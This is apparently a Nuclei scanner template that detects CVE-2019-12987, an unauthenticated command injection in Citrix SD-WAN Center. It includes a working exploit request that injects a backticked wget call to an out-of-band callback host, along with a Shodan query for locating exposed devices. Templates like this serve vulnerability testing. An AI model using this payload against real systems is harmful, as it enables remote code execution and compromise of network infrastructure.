http:
- matchers:
  - dsl:
    - contains(body_1, "<title>Citrix SD-WAN</title>")
    type: dsl
  - part: interactsh_protocol
    type: word
    words:
    - http
  matchers-condition: and
  raw:
  - 'GET /login HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /Collector/storagemgmt/apply?data%5B0%5D%5Bhost%5D=%60/bin/wget+http://{{interactsh-url}}%60&data%5B0%5D%5Bpath%5D=mypath&data%5B0%5D%5Btype%5D=mytype
    HTTP/1.1

    Host: {{Hostname}}

    Accept: */*


    '
  unsafe: true
id: CVE-2019-12987
info:
  author: gy741
  classification:
    cpe: cpe:2.3:a:citrix:netscaler_sd-wan:*:*:*:*:*:*:*:*
    cve-id: CVE-2019-12987
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.9985
    epss-score: 0.97297
  description: 'Citrix SD-WAN Center is susceptible to remote command injection via
    the apply action in StorageMgmtController. The callStoragePerl function does not
    sufficiently validate or sanitize HTTP request parameter values that are used
    to construct a shell command. An attacker can trigger this vulnerability by routing
    traffic through the Collector controller and supplying an array value with crafted
    values for action, host, path, or type, thereby potentially being able to obtain
    sensitive information, modify data, and/or execute unauthorized operations.

    '
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    access, data exfiltration, and potential compromise of the entire SD-WAN infrastructure.

    '
  metadata:
    max-request: 2
    product: netscaler_sd-wan
    shodan-query: http.title:"Citrix SD-WAN"
    vendor: citrix
  name: Citrix SD-WAN Center - Remote Command Injection
  reference:
  - https://www.tenable.com/security/research/tra-2019-31
  - https://support.citrix.com/article/CTX251987
  - https://nvd.nist.gov/vuln/detail/CVE-2019-12987
  remediation: 'Apply the latest security patches provided by Citrix to mitigate the
    vulnerability.

    '
  severity: critical
  tags: cve,cve2019,citrix,rce,unauth,oast,tenable
